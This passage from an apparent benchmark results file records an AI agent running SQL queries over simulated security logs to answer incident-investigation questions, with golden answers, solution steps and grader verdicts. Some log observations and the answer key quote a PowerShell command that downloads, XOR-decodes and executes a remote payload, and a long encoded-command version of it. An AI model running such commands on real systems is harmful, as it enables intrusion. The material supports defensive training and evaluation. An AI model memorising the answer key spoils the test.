+                "action": "SELECT ProcessId, FileName, ProcessCommandLine FROM DeviceProcessEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND (ProcessCommandLine = '' OR ProcessCommandLine IS NULL)",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT * FROM DeviceProcessEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND ActionType LIKE '%inject%'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT ProcessId, InitiatingProcessId, AdditionalFields FROM DeviceProcessEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND ActionType = 'ProcessAccess'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT InitiatingProcessCommandLine FROM DeviceProcessEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND InitiatingProcessCommandLine LIKE '%http%'",
+                "observation": "[('\"powershell.exe\"  -executionpolicy bypass -Command {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes(\\'WinATP-Intro-Injection\\');$base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))} ',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt",
+                "observation": "",
+                "reward": 1,
+                "done": true,
+                "info": {
+                    "check_ans_response": "Analysis: The submitted answer matches the golden answer in content, as the URL points to the same resource despite differences in case formatting (\"WinATP-Intro-Fileless.txt\" vs \"winatp-intro-fileless.txt\"). The meaning remains the same.\n\nIs_Answer_Correct: True",
+                    "reward": 1,
+                    "check_ans_reflection": "Reflection: The previous evaluation correctly identifies the difference in case formatting of the file name within the URL, which does not affect the overall URL's functionality or the content it refers to. This is an appropriate assessment for determining whether the submitted answer matches the golden answer.\n\nAnalysis: The submitted answer's URL only differs from the golden answer in casing, which is inconsequential in this context since URL handling is generally case-insensitive except in specific environments or cases. The two URLs are identical in terms of their purpose and destination.\n\nIs_Answer_Correct: True",
+                    "submitted_answer": "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt",
+                    "query_success": true,
+                    "submit": true
+                }
+            }
+        ]
+    },
+    {
+        "success": true,
+        "steps": 11,
+        "reward": 1,
+        "success_query_count": 10,
+        "total_query_count": 10,
+        "question": {
+            "context": "A suspicious process injection was observed where a process abnormally injected code into another process. This may cause unexpected code to run in the target process memory, potentially leading to abnormal behaviors such as opening a listening port or connecting to a command and control server. During the investigation of the security incident, it was identified that the suspicious activity occurred on host with hostname `vnevado-win11a`.",
+            "question": "What is the Process Id and the exact command line of the process that injected code as recorded on the endpoint during the suspicious process injection?",
+            "answer": "Process Id: 4656, Command Line: \"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblihiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aaqblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+            "solution": [
+                "There was a suspicious process injection using PowerShell on host `vnevado-win11a`.",
+                "The attacker used the command line `powershell.exe -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjeguabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text` with Process ID `4656` at `2024-06-26t15:49:41.4025245z`."
+            ],
+            "start_alert": 10,
+            "end_alert": 14,
+            "start_entities": [
+                1,
+                2,
+                3,
+                4,
+                8,
+                9,
+                11,
+                12,
+                13
+            ],
+            "end_entities": [
+                7
+            ],
+            "shortest_alert_path": [
+                10,
+                8,
+                14
+            ]
+        },
+        "trajectory": [
+            {
+                "action": "SHOW TABLES",
+                "observation": "[('AADManagedIdentitySignInLogs',), ('AADNonInteractiveUserSignInLogs',), ('AADServicePrincipalSignInLogs',), ('AZFWApplicationRule',), ('AZFWApplicationRuleAggregation',), ('AZFWDnsQuery',), ('AZFWIdpsSignature',), ('AZFWNetworkRule',), ('AZFWNetworkRuleAggregation',), ('AlertEvidence',), ('AlertInfo',), ('AuditLogs',), ('AzureMetrics',), ('CloudAppEvents',), ('DeviceEvents',), ('DeviceFileCertificateInfo',), ('DeviceFileEvents',), ('DeviceImageLoadEvents',), ('DeviceInfo',), ('DeviceLogonEvents',), ('DeviceNetworkEvents',), ('DeviceNetworkInfo',), ('DeviceProcessEvents',), ('DeviceRegistryEvents',), ('EmailAttachmentInfo',), ('EmailEvents',), ('EmailUrlInfo',), ('Heartbeat',), ('IdentityDirectoryEvents',), ('IdentityLogonEvents',), ('IdentityQueryEvents',), ('MicrosoftAzureBastionAuditLogs',), ('MicrosoftGraphActivityLogs',), ('SecurityAlert',), ('SecurityIncident',), ('SigninLogs',), ('ThreatIntelligenceIndicator',), ('Usage',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceProcessEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AccountDomain', 'text', 'YES', '', None, ''), ('AccountName', 'text', 'YES', '', None, ''), ('AccountObjectId', 'text', 'YES', '', None, ''), ('AccountSid', 'text', 'YES', '', None, ''), ('AccountUpn', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('FileName', 'text', 'YES', '', None, ''), ('FolderPath', 'text', 'YES', '', None, ''), ('FileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('InitiatingProcessLogonId', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('InitiatingProcessTokenElevation', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('LogonId', 'text', 'YES', '', None, ''), ('MD5', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('ProcessCommandLine', 'text', 'YES', '', None, ''), ('ProcessCreationTime', 'text', 'YES', '', None, ''), ('ProcessId', 'text', 'YES', '', None, ''), ('ProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('ProcessTokenElevation', 'text', 'YES', '', None, ''), ('ProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('ProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('InitiatingProcessSignerType', 'text', 'YES', '', None, ''), ('InitiatingProcessSignatureStatus', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('SHA1', 'text', 'YES', '', None, ''), ('SHA256', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT InitiatingProcessId, InitiatingProcessCommandLine FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a' AND ActionType LIKE '%inject%'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DISTINCT ActionType FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DeviceId FROM DeviceInfo WHERE DeviceName = 'vnevado-win11a'",
+                "observation": "[('fa37014e27eac3f926ae4540fe9bafdaa8d49550',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT InitiatingProcessId, InitiatingProcessCommandLine FROM DeviceProcessEvents WHERE DeviceId = 'fa37014e27eac3f926ae4540fe9bafdaa8d49550' AND ActionType LIKE '%inject%'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DISTINCT ActionType FROM DeviceProcessEvents WHERE DeviceId = 'fa37014e27eac3f926ae4540fe9bafdaa8d49550'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT ActionType, AdditionalFields FROM DeviceProcessEvents LIMIT 1",
+                "observation": "[('ProcessCreated', '{}')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AccountDomain', 'text', 'YES', '', None, ''), ('AccountName', 'text', 'YES', '', None, ''), ('AccountSid', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('FileName', 'text', 'YES', '', None, ''), ('FileOriginIP', 'text', 'YES', '', None, ''), ('FileOriginUrl', 'text', 'YES', '', None, ''), ('FolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessLogonId', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('LocalIP', 'text', 'YES', '', None, ''), ('LocalPort', 'text', 'YES', '', None, ''), ('LogonId', 'text', 'YES', '', None, ''), ('MD5', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('ProcessCommandLine', 'text', 'YES', '', None, ''), ('ProcessId', 'text', 'YES', '', None, ''), ('ProcessTokenElevation', 'text', 'YES', '', None, ''), ('RegistryKey', 'text', 'YES', '', None, ''), ('RegistryValueData', 'text', 'YES', '', None, ''), ('RegistryValueName', 'text', 'YES', '', None, ''), ('RemoteDeviceName', 'text', 'YES', '', None, ''), ('RemoteIP', 'text', 'YES', '', None, ''), ('RemotePort', 'text', 'YES', '', None, ''), ('RemoteUrl', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('SHA1', 'text', 'YES', '', None, ''), ('SHA256', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('FileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('ProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT InitiatingProcessId, InitiatingProcessCommandLine FROM DeviceEvents WHERE DeviceId = 'fa37014e27eac3f926ae4540fe9bafdaa8d49550' AND ActionType LIKE '%inject%' OR ActionType LIKE '%remote%' OR ActionType LIKE '%thread%'",
+                "observation": "[('4976.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('8360.0', '\"firefox.exe\" --backgroundtask install'), ('4004.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('6548.0', '\"firefox.exe\" --backgroundtask install'), ('5276.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('10044.0', '\"firefox.exe\" --backgroundtask install'), ('5276.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('10044.0', '\"firefox.exe\" --backgroundtask install'), ('6552.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('9140.0', '\"firefox.exe\" --backgroundtask install'), ('10212.0', '\"firefox.exe\" '), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('0.0', ''), ('4976.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('8360.0', '\"firefox.exe\" --backgroundtask install'), ('6552.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('9140.0', '\"firefox.exe\" --backgroundtask install'), ('4004.0', '\"firefox.exe\" --backgroundtask defaultagent register-task 308046B0AF4A39CB'), ('6548.0', '\"firefox.exe\" --backgroundtask install'), ('10476.0', '\"firefox.exe\"'), ('10212.0', '\"firefox.exe\" '), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('10476.0', '\"firefox.exe\"'), ('0.0', ''), ('0.0', ''), ('0.0', ''), ('0.0', ''), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'), ('576.0', 'csrss.exe ObjectDirectory=Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 